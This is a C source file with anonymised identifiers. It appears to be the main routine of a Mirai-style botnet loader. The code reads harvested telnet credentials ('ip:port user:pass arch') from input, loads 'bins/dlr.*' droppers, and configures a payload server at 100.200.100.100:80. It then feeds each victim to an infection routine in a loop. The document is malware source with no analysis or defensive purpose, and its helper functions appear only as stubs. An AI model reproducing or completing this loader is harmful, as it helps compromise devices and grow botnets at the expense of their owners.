
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;




typedef struct TYPE_4__ TYPE_1__ ;


typedef int uint8_t ;
typedef scalar_t__ uint32_t ;
struct telnet_info {int dummy; } ;
typedef int strbuf ;
typedef int pthread_t ;
typedef int ipv4_t ;
struct TYPE_4__ {int curr_open; int total_input; } ;


 scalar_t__ FUNC_0 (int *) ;
 int FUNC_1 (int *) ;
 scalar_t__ VAR_0 ;
 int VAR_1 ;
 int FUNC_2 () ;
 int * FUNC_3 (int,int) ;
 int * FUNC_4 (char*,int,int ) ;
 char* VAR_2 ;
 int FUNC_5 (char*) ;
 int FUNC_6 (struct telnet_info*,int ,int) ;
 int FUNC_7 (char*,...) ;
 int FUNC_8 (int *,int *,int ,int *) ;
 TYPE_1__* FUNC_9 (int ,int,int *,int,char*,int,char*) ;
 int FUNC_10 (TYPE_1__*,struct telnet_info*) ;
 int FUNC_11 (int) ;
 TYPE_1__* VAR_3 ;
 int VAR_4 ;
 int VAR_5 ;
 scalar_t__ FUNC_12 (char*) ;
 int FUNC_13 (int ) ;
 int * FUNC_14 (char*,struct telnet_info*) ;
 int FUNC_15 (int) ;
 int FUNC_16 (char*) ;

int FUNC_17(int VAR_6, char **VAR_7)
{
    pthread_t VAR_8;
    uint8_t VAR_9;
    ipv4_t *VAR_10;
    uint32_t VAR_11 = 0;
    struct telnet_info VAR_12;






    VAR_9 = 2;
    VAR_10 = FUNC_3(VAR_9, sizeof (ipv4_t));

    VAR_10[0] = FUNC_5("192.168.0.1");
    VAR_10[1] = FUNC_5("192.168.1.1");


    if (VAR_6 == 2)
    {
        VAR_2 = VAR_7[1];
    }

    if (!FUNC_2())
    {
        FUNC_7("Failed to load bins/dlr.* as dropper\n");
        return 1;
    }


    if ((VAR_3 = FUNC_9(FUNC_13(VAR_1), VAR_9, VAR_10, 1024 * 64, "100.200.100.100", 80, "100.200.100.100")) == ((void*)0))
    {
        FUNC_7("Failed to initialize server. Aborting\n");
        return 1;
    }

    FUNC_8(&VAR_8, ((void*)0), VAR_4, ((void*)0));


    while (VAR_0)
    {
        char VAR_13[1024];

        if (FUNC_4(VAR_13, sizeof (VAR_13), VAR_5) == ((void*)0))
            break;

        FUNC_16(VAR_13);

        if (FUNC_12(VAR_13) == 0)
        {
            FUNC_15(10000);
            continue;
        }

        FUNC_6(&VAR_12, 0, sizeof(struct telnet_info));
        if (FUNC_14(VAR_13, &VAR_12) == ((void*)0))
            FUNC_7("Failed to parse telnet info: \"%s\" Format -> ip:port user:pass arch\n", VAR_13);
        else
        {
            if (VAR_3 == ((void*)0))
                FUNC_7("srv == NULL 2\n");

            FUNC_10(VAR_3, &VAR_12);
            if (VAR_11++ % 1000 == 0)
                FUNC_11(1);
        }

        FUNC_1(&VAR_3->total_input);
    }

    FUNC_7("Hit end of input.\n");

    while(FUNC_0(&VAR_3->curr_open) > 0)
        FUNC_11(1);

    return 0;
}
